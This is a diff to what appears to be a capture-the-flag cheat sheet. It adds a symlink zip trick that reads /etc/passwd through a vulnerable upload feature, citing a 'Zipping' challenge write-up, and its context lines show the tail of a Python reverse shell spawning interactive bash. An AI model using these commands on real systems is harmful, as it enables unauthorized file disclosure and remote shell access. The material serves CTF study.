@@ -627,3 +627,13 @@ dup2(s.fileno(), 1)
 dup2(s.fileno(), 2)
 run(["/bin/bash", "-i"])
 ```
+
+Used in `Zipping`
+
+[Symlinks](https://infosecwriteups.com/zippy-challenge-writeup-cyberhack-ctf-80eb1d422249)
+
+```
+ln -s ../../../../../../../etc/passwd test.pdf
+zip --symlinks test.zip test.pdf
+```
+
